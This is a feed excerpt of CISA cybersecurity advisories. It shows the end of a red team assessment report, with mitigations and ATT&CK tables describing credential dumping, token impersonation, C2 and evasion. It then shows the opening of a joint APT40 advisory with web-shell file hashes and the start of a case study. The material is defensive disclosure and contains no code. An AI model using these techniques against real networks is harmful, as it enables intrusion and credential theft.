<li><a href=\"https://www.cisa.gov/resources-tools/resources/secure-design-alert-how-manufacturers-can-protect-customers-eliminating-default-passwords\" title=\"Secure by Design Alert: How Manufacturers Can Protect Customers by Eliminating Default Passwords\"><strong>Eliminate default passwords</strong></a><strong>&nbsp;</strong>and determine what password practices should be required (such as minimum password length and disallowing known breached passwords). Configure software to use more secure authentication schemes by default.</li>
<li><strong>Provide logging at no additional charge</strong>. Cloud services and on-premises products should commit to generating and storing security related logs at no additional cost.</li>
<li><strong>Work with security information and event management (SIEM) and security orchestration, automation, and response (SOAR) providers</strong>—in conjunction with customers—to understand how response teams use logs to investigate incidents. The goal is to develop logs that yield a comprehensive story of the event.</li>
<li><strong>Remove unnecessary software dependencies</strong>. Unnecessary software increases the attack surface available to adversaries and may introduce additional vulnerabilities. Mitigating these additional vulnerabilities requires significant investment, consuming resources like time, technical personnel, and adding to the level of security effort.</li>
</ul>
<p>These mitigations align with tactics provided in the joint guide <a href=\"https://www.cisa.gov/sites/default/files/2023-10/Shifting-the-Balance-of-Cybersecurity-Risk-Principles-and-Approaches-for-Secure-by-Design-Software.pdf\" title=\"Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software\">Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software</a>. CISA urges software manufacturers to take ownership of improving the security outcomes of their customers by applying these and other secure by design tactics. By using secure by design tactics, software manufacturers can make their product lines secure “out of the box” without requiring customers to spend additional resources making configuration changes, purchasing security software and logs, monitoring, and making routine updates.&nbsp;</p>
<p>For more information on secure by design, see CISA’s <a href=\"https://www.cisa.gov/securebydesign\" title=\" Secure by Design\">Secure by Design</a> webpage. For more information on common misconfigurations and guidance on reducing their prevalence, see joint advisory <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-278a\" title=\"NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations\">NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations</a>.</p>
<h3>VALIDATE SECURITY CONTROLS</h3>
<p>In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
<li>Select an ATT&amp;CK technique described in this advisory (see Tables 3–11).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<p>CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>
<h3>RESOURCES</h3>
<ul>
<li><a href=\"https://www.cisa.gov/resources-tools/resources/layering-network-security-through-segmentation-infographic\" title=\"Layering Network Security Through Segmentation Infographic\">Layering Network Security Through Segmentation</a></li>
<li><a href=\"https://www.cisa.gov/resources-tools/resources/ics-recommended-practices\" title=\"ICS Recommended Practices - Recommended Practice: Improving Industrial Control System Cybersecurity with Defense-in-Depth Strategies\">Recommended Practice: Improving Industrial Control System Cybersecurity with Defense-in-Depth Strategies</a></li>
<li><a href=\"https://www.cisa.gov/resources-tools/resources/phishing-guidance-stopping-attack-cycle-phase-one\" title=\"Phishing Guidance: Stopping the Attack Cycle at Phase One\">Phishing Guidance: Stopping the Attack Cycle at Phase One</a></li>
<li><a href=\"https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm\" title=\"BOFs\">BOFs</a></li>
<li><a href=\"https://blog.blacklanternsecurity.com/p/detecting-dcsync\" title=\"Detecting DCSync\">Detecting DCSync</a></li>
<li><a href=\"https://pentestlaboratories.com/2020/05/26/appdomainmanager-injection-and-detection/\" title=\"AppDomainManager Injection and Detection\">App Domain Hijacking Overview</a></li>
</ul>
<h3>DISCLAIMER</h3>
<p>The information in this report is being provided “as is” for informational purposes only. CISA does not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA.</p>
<h3>VERSION HISTORY</h3>
<p>July 11, 2024: Initial version.</p>
<h3>APPENDIX: MITRE ATT&amp;CK TACTICS AND TECHNIQUES</h3>
<p>See Tables 3–11 for all referenced threat actor tactics and techniques in this advisory.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 3: Reconnaissance</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Search Victim-Owned Websites</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1594/\" title=\"Search Victim-Owned Websites\">T1594</a></td>
<td>CISA’s red team used open source tools and services to probe the organization’s internet-facing presence and gather information, including names, roles, and contact information.</td>
</tr>
<tr>
<td>Gather Victim Network Information: DNS</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1590/002/\" title=\"Gather Victim Network Information: DNS\">T1590.002</a></td>
<td>The red team gathered information about the organization’s DNS records, which revealed several details about the organization's internal network.</td>
</tr>
<tr>
<td>Gather Victim Identity Information: Employee Names</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1589/003/\" title=\"Gather Victim Identity Information: Employee Names\">T1589.003</a></td>
<td>CISA’s red team collected the assessed organizations’&nbsp;employee names to use their email addresses for specific targeting based on roles and responsibilities.</td>
</tr>
<tr>
<td>Gather Victim Org Information: Identity Roles</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1591/004/\" title=\"Gather Victim Org Information: Identity Roles\">T1591.004</a></td>
<td>CISA’s red team selected specific individuals from the assessed organization and targeted them with phishing payloads.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4: Command and Control</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Application Layer Protocol: Web Protocols</td>
<td><a href=\"https://attack.mitre.org/techniques/T1071/001/\" title=\"Application Layer Protocol: Web Protocols\">T1071.001</a></td>
<td>The red team exploited <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-21587\" title=\"CVE-2022-21587 Detail\">CVE-2022-21587</a> and ran a RAT that provided consistent C2 via open Transmission Control Protocol (TCP) ports.</td>
</tr>
<tr>
<td>Non-Standard Port</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1571/\" title=\"Non-Standard Port\">T1571</a></td>
<td>The red team used SSH over ports <code>80</code> and/or <code>443</code> when establishing outbound C2.</td>
</tr>
<tr>
<td>Proxy: Domain Fronting</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/004/\" title=\"Proxy: Domain Fronting\">T1090.004</a></td>
<td>CISA’s red team leveraged domain fronting to redirect and obfuscate their traffic.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5: Credential Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Brute Force: Password Cracking</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/002/\" title=\"Brute Force: Password Cracking\">T1110.002</a></td>
<td>The red team cracked an account’s password by using a common wordlist.</td>
</tr>
<tr>
<td>OS Credential Dumping: DCSync</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/006/\" title=\"OS Credential Dumping: DCSync\">T1003.006</a></td>
<td>CISA’s red team pulled credentials for the domain via DCSync to gain full access to the domain.</td>
</tr>
<tr>
<td>Unsecured Credentials: Bash History</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1552/003/\" title=\"Unsecured Credentials: Bash History\">T1552.003</a></td>
<td>The red team obtained a password by searching a user’s bash command history, which provided further unprivileged access throughout the network.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6: Discovery</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Domain Trust Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1482/\" title=\"Domain Trust Discovery\">T1482</a></td>
<td>CISA’s red team inspected the assessed organization’s&nbsp;domain trust relationships through LDAP and identified potential connections in external organizations to which to move laterally.</td>
</tr>
<tr>
<td>File and Directory Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1083/\" title=\"File and Directory Discovery\">T1083</a></td>
<td>The red team data mined numerous internal servers and discovered one misconfigured share that contained plaintext usernames and passwords for several privileged service accounts.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7: Privilege Escalation</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Hijack Execution Flow: Path Interception by PATH Environment Variable</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1574/007/\" title=\"Hijack Execution Flow: Path Interception by PATH Environment Variable\">T1574.007</a></td>
<td>The red team hijacked the execution flow of a program that used a relative path instead of an absolute path, which enabled the capture of the account’s password.</td>
</tr>
<tr>
<td>Access Token Manipulation: Token Impersonation/Theft</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1134/001/\" title=\"Access Token Manipulation: Token Impersonation/Theft\">T1134.001</a></td>
<td>CISA’s red team impersonated the tokens of current users to exploit valid sessions and bypass the organization’s IDM.</td>
</tr>
<tr>
<td>Access Token Manipulation: Make and Impersonate Token</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1134/003/\" title=\"Access Token Manipulation: Make and Impersonate Token\">T1134.003</a></td>
<td>CISA’s red team created new tokens and logon sessions for accounts not registered with the IDM to escalate privileges.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8: Lateral Movement</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Services: SSH</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1021/004/\" title=\"Remote Services: SSH\">T1021.004</a></td>
<td>CISA’s red team used SSH with a valid account to move through the enclave.</td>
</tr>
<tr>
<td>Proxy</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a></td>
<td>The red team used a SOCKS proxy to avoid direct connections to their infrastructure and obscure the source of the malicious traffic.</td>
</tr>
<tr>
<td>Use Alternate Authentication Material: Pass the Hash</td>
<td><a href=\"https://attack.mitre.org/techniques/T1550/002/\" title=\"Use Alternate Authentication Material: Pass the Hash\">T1550.002</a></td>
<td>The red team’s operations were hindered by the organization’s IDM when it blocked the team's attempts to bypass system access controls using different hash types for authentication.</td>
</tr>
<tr>
<td>Use Alternate Authentication Material: Pass the Ticket</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1550/003/\" title=\"Use Alternate Authentication Material: Pass the Ticket\">T1550.003</a></td>
<td>CISA’s red team’s operations were hindered by the organization’s &nbsp;IDM when it blocked the team’s attempts to bypass system access controls using Kerberos tickets for authentication.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9: Collection</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Data from Local System</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1005/\" title=\"Data from Local System\">T1005</a></td>
<td>CISA’s red team searched each host for files containing sensitive or interesting information such as password hashes, account information, network configurations, etc.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10: Persistence</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Scheduled Task/Job: Cron</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1053/003/\" title=\"Scheduled Task/Job: Cron\">T1053.003</a></td>
<td>The red team used the <code>cron</code> utility to perform task scheduling and execute malicious code within Unix systems at specified times.</td>
</tr>
<tr>
<td>Scheduled Task/Job: At</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1053/002/\" title=\"Scheduled Task/Job: At\">T1053.002</a></td>
<td>CISA’s red team used the <code>at</code> utility to perform task scheduling and execute malicious code within Unix systems at a specified time and date.</td>
</tr>
<tr>
<td>Hijack Execution Flow: AppDomainManager</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1574/014/\" title=\"Hijack Execution Flow: AppDomainManager\">T1574.014</a></td>
<td>The red team executed malicious payloads by hijacking how the <code>.NETAppDomainManager</code> loads assemblies.</td>
</tr>
<tr>
<td>Valid Accounts: Domain Accounts</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/002/\" title=\"Valid Accounts: Domain Accounts\">T1078.002</a></td>
<td>CISA’s red team regularly used compromised valid domain accounts managed by Active Directory, giving access to resources of the domain.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 11: Defensive Evasion</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Masquerading: Masquerade Task or Service</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1036/004/\" title=\"Masquerading: Masquerade Task or Service\">T1036.004</a></td>
<td>The red team enumerated local files and running processes to gather information for their payloads and persistence mechanisms to appear as legitimate activity.</td>
</tr>
<tr>
<td>Obfuscated Files or Information</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1027/\" title=\"Obfuscated Files or Information\">T1027</a></td>
<td>CISA’s red team encrypted, encoded, and obfuscated their executables and C2 channels to evade defenses across the network.</td>
</tr>
<tr>
<td>File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1222/002/\" title=\"File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification\">T1222.002</a></td>
<td>The red team modified file permissions with <code>touch</code> and <code>chmod/chown</code> commands to obfuscate their activity and blend in with other files in the environment.</td>
</tr>
<tr>
<td>Indicator Removal: Timestomp</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1070/006/\" title=\"Indicator Removal: Timestomp\">T1070.006</a></td>
<td>CISA’s red team modified file timestamps to hide their operational activity.</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
") (pubDate nil "Tue, 09 Jul 2024 10:09:48 EDT") (creator nil "CISA") (guid ((isPermaLink . "false")) "/node/21739")) (item nil (title nil "People’s Republic of China (PRC) Ministry of State Security APT40 Tradecraft in Action ") (link nil "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-190a") (description nil "<h2><strong>Overview</strong></h2>
<h3>Background</h3>
<p>This advisory, authored by the Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC), the United States Cybersecurity and Infrastructure Security Agency (CISA), the United States National Security Agency (NSA), the United States Federal Bureau of Investigation (FBI), the United Kingdom National Cyber Security Centre (NCSC-UK), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NCSC-NZ), the German Federal Intelligence Service (BND) and Federal Office for the Protection of the Constitution (BfV), the Republic of Korea’s National Intelligence Service (NIS) and NIS’ National Cyber Security Center, and Japan’s National Center of Incident Readiness and Strategy for Cybersecurity (NISC) and National Police Agency (NPA)—hereafter referred to as the “authoring agencies”—outlines a People’s Republic of China (PRC) state-sponsored cyber group and their current threat to Australian networks. The advisory draws on the authoring agencies’ shared understanding of the threat as well as ASD’s ACSC incident response investigations.</p>
<p>The PRC state-sponsored cyber group has previously targeted organizations in various countries, including Australia and the United States, and the techniques highlighted below are regularly used by other PRC state-sponsored actors globally. Therefore, the authoring agencies believe the group, and similar techniques remain a threat to their countries’ networks as well.</p>
<p>The authoring agencies assess that this group conduct malicious cyber operations for the PRC Ministry of State Security (MSS). The activity and techniques overlap with the groups tracked as Advanced Persistent Threat (APT) 40 (also known as Kryptonite Panda, GINGHAM TYPHOON, Leviathan and Bronze Mohawk in industry reporting). This group has previously been reported as being based in Haikou, Hainan Province, PRC and receiving tasking from the PRC MSS, Hainan State Security Department.[1]</p>
<p>The following Advisory provides a sample of significant case studies of this adversary’s techniques in action against two victim networks. The case studies are consequential for cybersecurity practitioners to identify, prevent and remediate APT40 intrusions against their own networks. The selected case studies are those where appropriate remediation has been undertaken reducing the risk of re-exploitation by this threat actor, or others. As such, the case studies are naturally older in nature, to ensure organizations were given the necessary time to remediate.</p>
<p>To download the PDF version of this report, visit the following link, <a href=\"https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/apt40-advisory-prc-mss-tradecraft-in-action\">APT40 Advisory</a>.</p>
<h3>Activity Summary</h3>
<p>APT40 has repeatedly targeted Australian networks as well as government and private sector networks in the region, and the threat they pose to our networks is ongoing. The tradecraft described in this advisory is regularly observed against Australian networks.</p>
<p>Notably, APT40 possesses the capability to rapidly transform and adapt exploit proof-of-concept(s) (POCs) of new vulnerabilities and immediately utilize them against target networks possessing the infrastructure of the associated vulnerability. APT40 regularly conducts reconnaissance against networks of interest, including networks in the authoring agencies’ countries, looking for opportunities to compromise its targets. This regular reconnaissance postures the group to identify vulnerable, end-of-life or no longer maintained devices on networks of interest, and to rapidly deploy exploits. APT40 continues to find success exploiting vulnerabilities from as early as 2017.</p>
<p>APT40 rapidly exploits newly public vulnerabilities in widely used software such as Log4J (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-44228\" title=\"CVE-2021-44228\">CVE-2021-44228</a>), Atlassian Confluence (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-31207\" title=\"CVE-2021-31207\">CVE-2021-31207</a>,&nbsp;<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-26084\" title=\"CVE-2021-26084\">CVE-2021-26084</a>) and Microsoft Exchange (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-31207\" title=\"CVE-2021-31207\">CVE-2021-31207</a>,&nbsp;<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-34523\" title=\"CVE-2021-34523\">CVE-2021-34523</a>,&nbsp;<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-34473\" title=\"CVE-2021-34473\">CVE-2021-34473</a>). ASD’s ACSC and the authoring agencies expect the group to continue using POCs for new high-profile vulnerabilities within hours or days of public release.</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/AA24-190A-apt40-figure-1_0.png?itok=a7YAYqy0\" width=\"1024\" height=\"685\" alt=\"Figure 1: TTP Flowchart for APT40 Activity\">


</div>
  </figure>
<p>Figure 1: TTP Flowchart for APT40 activity</p>
<p>This group appears to prefer exploiting vulnerable, public-facing infrastructure over techniques that require user interaction, such as phishing campaigns, and places a high priority on obtaining valid credentials to enable a range of follow-on activities. APT40 regularly uses web shells [<a href=\"https://attack.mitre.org/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a>] for persistence, particularly early in the life cycle of an intrusion. Typically, after successful initial access APT40 focuses on establishing persistence to maintain access on the victim’s environment. However, as persistence occurs early in an intrusion, it is more likely to be observed in all intrusions—regardless of the extent of compromise or further actions taken.</p>
<h3>Notable Tradecraft</h3>
<p>Although APT40 has previously used compromised Australian websites as command and control (C2) hosts for its operations, the group have evolved this technique [<a href=\"https://attack.mitre.org/techniques/T1594/\" title=\"Search Victim-Owned Websites\">T1594</a>].</p>
<p>APT40 has embraced the global trend of using compromised devices, including small-office/home-office (SOHO) devices, as operational infrastructure and last-hop redirectors [<a href=\"https://attack.mitre.org/techniques/T1584/008/\" title=\"Compromise Infrastructure: Network Devices\">T1584.008</a>] for its operations in Australia. This has enabled the authoring agencies to better characterize and track this group’s movements.</p>
<p>Many of these SOHO devices are end-of-life or unpatched and offer a soft target for N-day exploitation. Once compromised, SOHO devices offer a launching point for attacks that is designed to blend in with legitimate traffic and challenge network defenders [<a href=\"https://attack.mitre.org/techniques/T1001/003/\" title=\"Data Obfuscation: Protocol Impersonation\">T1001.003</a>].</p>
<p>This technique is also regularly used by other PRC state-sponsored actors worldwide, and the authoring agencies consider this to be a shared threat. For additional information, see joint advisories <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-158a\" title=\"People’s Republic of China State-Sponsored Cyber Actors Exploit Network Providers and Devices\">People’s Republic of China State-Sponsored Cyber Actors Exploit Network Providers and Devices</a> and <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a\" title=\"PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure\">PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure</a>.</p>
<p>APT40 does occasionally use procured or leased infrastructure as victim-facing C2 infrastructure in its operations; however, this tradecraft appears to be in relative decline.</p>
<h3>Tooling</h3>
<p>ASD’s ACSC are sharing some of the malicious files identified during the investigations outlined below. These files have been uploaded to VirusTotal to enable the wider network defense and cyber security communities to better understand the threats they need to defend against.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">MD5</th>
<th role=\"columnheader\">Filename</th>
<th role=\"columnheader\">Additional information</th>
</tr>
</thead>
<tbody>
<tr>
<td>26a5a7e71a601be991073c78d513dee3</td>
<td><a href=\"https://www.virustotal.com/gui/file/44369783a819a38909e89449495fb98c3f9ba07dd0d2fa55a24a560a89f21a86/details\" title=\"horizon.jsp\">horizon.jsp</a></td>
<td>1 kB | Java Source</td>
</tr>
<tr>
<td>87c88f06a7464db2534bc78ec2b915de</td>
<td><a href=\"https://www.virustotal.com/gui/file/b1cca678dbd6bd51e6e8e797b95dc3050a74f5fa8147603473d6229023f1eb1a/details\" title=\"Index_jsp$ProxyEndpoint$Attach.class\">Index_jsp$ProxyEndpoint$Attach.class</a></td>
<td>597 B | Java Bytecode</td>
</tr>
<tr>
<td>6a9bc68c9bc5cefaf1880ae6ffb1d0ca</td>
<td><a href=\"https://www.virustotal.com/gui/file/71f6b36bfddda2d3a506574991a44636f84df28f9350e7856d1cc8af07cdd821/details\" title=\"Index_jsp.class\">Index_jsp.class</a></td>
<td>5 kB | Java Bytecode</td>
</tr>
<tr>
<td>64454645a9a21510226ab29e01e76d39</td>
<td><a href=\"https://www.virustotal.com/gui/file/97daa26c59e0e151f66872147ccd30dd1815bc6e63ec40c288130c6e8a6ea992/details\" title=\"Index_jsp.java\">Index_jsp.java</a></td>
<td>5 kB | Java Source</td>
</tr>
<tr>
<td>e2175f91ce3da2e8d46b0639e941e13f</td>
<td><a href=\"https://www.virustotal.com/gui/file/1a2282cc4c13bd24b2ca20c494cacbd283fbdcc4864d9cde26ea55db800f4dda/details\" title=\"Index_jsp$ProxyEndpoint.class\">Index_jsp$ProxyEndpoint.class</a></td>
<td>4 kB | Java Bytecode</td>
</tr>
<tr>
<td>9f89f069466b8b5c9bf25c9374a4daf8</td>
<td><a href=\"https://www.virustotal.com/gui/file/0e3324587a07df499e97b58076a94e86bf5598cc6d9606c2dcee3941175ff043/details\" title=\"Index_jsp$ProxyEndpoint$1.class\">Index_jsp$ProxyEndpoint$1.class</a></td>
<td>3 kB | Java Bytecode</td>
</tr>
<tr>
<td>187d6f2ed2c80f805461d9119a5878ac</td>
<td><a href=\"https://www.virustotal.com/gui/file/2aad0f8b439c3824d51871a0744c0e2f578277e0ec73effe5a24c49d8048bc74/details\" title=\"Index_jsp$ProxyEndpoint$2.class\">Index_jsp$ProxyEndpoint$2.class</a></td>
<td>1 kB | Java Bytecode</td>
</tr>
<tr>
<td>ed7178cec90ed21644e669378b3a97ec</td>
<td><a href=\"https://www.virustotal.com/gui/file/882f39945974aa5fc6005bf646ee3ab21bf69de12985d6ad8cc497dbfe520728/details\" title=\"Nova_jsp.class\">Nova_jsp.class</a></td>
<td>7 kB | Java Bytecode</td>
</tr>
<tr>
<td>5bf7560d0a638e34035f85cd3788e258</td>
<td><a href=\"https://www.virustotal.com/gui/file/b271e74ed44c3c405da858f29b6dfd4a99658dcac7bc83938079ad0dbbdf1b66/details\" title=\"Nova_jsp$TomcatListenerMemShellFromThread.class\">Nova_jsp$TomcatListenerMemShellFromThread.class</a></td>
<td>8 kB | Java Bytecode</td>
</tr>
<tr>
<td>e02be0dc614523ddd7a28c9e9d500cff</td>
<td><a href=\"https://www.virustotal.com/gui/file/7c7acd87b47d405da4d6efa2c43599148e12c094970ba198905f0a165d79a78f/details\" title=\"Nova_jsp.java\">Nova_jsp.java</a></td>
<td>15 kB | Java Source</td>
</tr>
</tbody>
</table>
<h3>Case Studies</h3>
<p>ASD’s ACSC are sharing two anonymized investigative reports to provide awareness of how the actors employ their tools and tradecraft.</p>
<h2><strong>Case Study 1</strong></h2>
<h5>This report has been anonymized to enable wider dissemination. The impacted organization is hereafter referred to as “the organization.” Some specific details have been removed to protect the identity of the victim and incident response methods of ASD’s ACSC.</h5>
<div>
<h3>Executive Summary</h3>
<p>This report details the findings of the ASD’s ACSC investigation into the successful compromise of the organization’s network between July and September 2022. This investigative report was provided to the organization to summarize observed malicious activity and frame remediation recommendations. The findings indicate the compromise was undertaken by APT40.</p>
<p>In mid-August, the ASD’s ACSC notified the organization of malicious interactions with their network from a likely compromised device being used by the group in late August and, with the organization’s consent, the ASD’s ACSC deployed host-based sensors to likely affected hosts on the organization’s network. These sensors allowed ASD’s ACSC incident response analysts to undertake a thorough digital forensics investigation. Using available sensor data, the ASD’s ACSC analysts successfully mapped the group’s activity and created a detailed timeline of observed events.</p>
<p>From July to August, key actor activity observed by the ASD’s ACSC included:</p>
<ul>
<li>Host enumeration, which enables an actor to build their own map of the network;</li>
<li>Web shell use, giving the actor an initial foothold on the network and a capability to execute commands; and</li>
<li>Deployment of other tooling leveraged by the actor for malicious purposes.</li>
</ul>
<p>The investigation uncovered evidence of large amounts of sensitive data being accessed and evidence that the actors moved laterally through the network [<a href=\"https://attack.mitre.org/techniques/T1021/002/\" title=\"Remote Services: SMB/Windows Admin Shares\">T1021.002</a>]. Much of the compromise was facilitated by the group’s establishment of multiple access vectors into the network, the network having a flat structure, and the use of insecure internally developed software that could be used to arbitrarily upload files. Exfiltrated data included privileged authentication credentials that enabled the group to log in, as well as network information that would allow the actors to regain unauthorized access if the original access vector was blocked. No additional malicious tooling was discovered beyond those on the initially exploited machine; however, a group’s access to legitimate and privileged credentials would negate the need for additional tooling. Findings from the investigation indicate the organization was likely deliberately targeted by APT40, as opposed to falling victim opportunistically to a publicly known vulnerability.</p>
<h2><strong>Investigation Findings</strong></h2>
<p>In mid-August 2022, the ASD’s ACSC notified the organization that a confirmed malicious IP believed to be affiliated with a state-sponsored cyber group had interacted with the organization’s computer networks between at least July and August. The compromised device probably belonged to a small business or home user.</p>
<p>In late August, the ASD’s ACSC deployed a host-based agent to hosts on the organization’s network which showed evidence of having been impacted by the compromise.</p>
<p>Some artefacts which could have supported investigation efforts were not available due to the configuration of logging or network design. Despite this, the organization’s readiness to provide all available data enabled ASD’s ACSC incident responders to conduct comprehensive analysis and to form an understanding of likely APT40 activity on the network.</p>
<p>In September, after consultation with the ASD’s ACSC, the organization decided to denylist the IP identified in the initial notification. In October, the organization commenced remediation.</p>
<h3>Details</h3>
